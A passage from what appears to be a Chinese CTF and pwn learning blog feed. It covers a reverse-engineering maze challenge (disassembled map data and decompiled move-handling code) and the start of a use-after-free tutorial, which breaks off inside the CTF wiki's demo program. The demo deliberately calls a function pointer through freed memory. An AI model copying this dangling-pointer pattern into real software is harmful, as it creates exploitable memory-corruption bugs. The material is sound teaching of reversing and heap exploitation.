class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">  </span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span></span><br><span class=\"line\">  </span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span> _data           ends</span><br></pre></td></tr></table></figure>\n\n<p>调整格式注意这里就好,15个字符一行<img src=\"/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-2-%E5%88%B7%E9%A2%98/image-20230307144741557.png\" alt=\"image-20230307144741557\">\t\t</p>\n<p>100,115,119,97 d s w a              对应了前后左右四个键</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_940</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-218h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+Ch] [rbp-214h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v4[<span class=\"number\">520</span>]; <span class=\"comment\">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+218h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  _isoc99_scanf(&amp;unk_1278, v4, v4);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      sub_86C();</span><br><span class=\"line\">      v0 = v4[v3];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v0 == <span class=\"number\">100</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v2 = sub_E23();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v0 &gt; <span class=\"number\">100</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v0 == <span class=\"number\">115</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v2 = sub_C5A();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v0 == <span class=\"number\">119</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v2 = sub_A92();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v0 == <span class=\"number\">27</span> )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v0 == <span class=\"number\">97</span> )</span><br><span class=\"line\">          v2 = sub_FEC();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v2 != <span class=\"number\">1</span> );</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( dword_202AB0 == <span class=\"number\">2</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    ++dword_202AB0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;success! the flag is flag&#123;md5(your input)&#125;&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h2><h3 id=\"BABYRE\"><a href=\"#BABYRE\" class=\"headerlink\" title=\"BABYRE\"></a>BABYRE</h3><p>怎么转换数据把那个数组数据拿出来?</p>\n<p>代码做了加密,要解一下</p>\n<h3 id><a href=\"#\" class=\"headerlink\" title></a></h3><p><a href=\"https://blog.rois.io/2021/rctf-2021-official-writeup-2/\">https://blog.rois.io/2021/rctf-2021-official-writeup-2/</a></p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>__readfsqword函数</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/",
            "title": "pwn入门-15-堆利用之Use-After-Free",
            "date_published": "2023-03-06T05:21:37.000Z",
            "content_html": "<h1 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h1><p>复制的wiki的:</p>\n<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>\n<ul>\n<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>\n</ul>\n<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>\n<h2 id=\"自己的理解\"><a href=\"#自己的理解\" class=\"headerlink\" title=\"自己的理解\"></a>自己的理解</h2><p>​\t\t<font color=\"red\">我理解的就是free后没有清空指针,导致还可以继续利用,利用的方式就是申请到free的bins然后覆盖上数据,借此修改一些函数指向等</font></p>\n<p>​\t\t4.16补充: 其实利用方式很多,总的来说是free后要对它能进行一定的操作,然后free前的功能还能用,比如puts等,就会导致问题.</p>\n<h1 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h1><p>​\t\t这是wiki上的例子,可以编译一下然后看看效果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">name</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *myname;</span><br><span class=\"line\">  <span class=\"type\">void</span> (*func)(<span class=\"type\">char</span> *str);</span><br><span class=\"line\">&#125; NAME;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">myprint</span><span class=\"params\">(<span class=\"type\">char</span> *str)</span> &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, str); &#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">printmyname</span><span class=\"params\">()</span> &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call print my name\\n&quot;</span>); &#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  NAME *a;</span><br><span class=\"line\">  a = (NAME *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> name));</span><br><span class=\"line\">  a-&gt;func = myprint;</span><br><span class=\"line\">  a-&gt;myname = <span class=\"string\">&quot;I can also use it&quot;</span>;</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;this is my function&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// free without modify</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;I can also use it&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// free with modify</span></span><br><span class=\"line\">  a-&gt;func = printmyname;</span><br><span 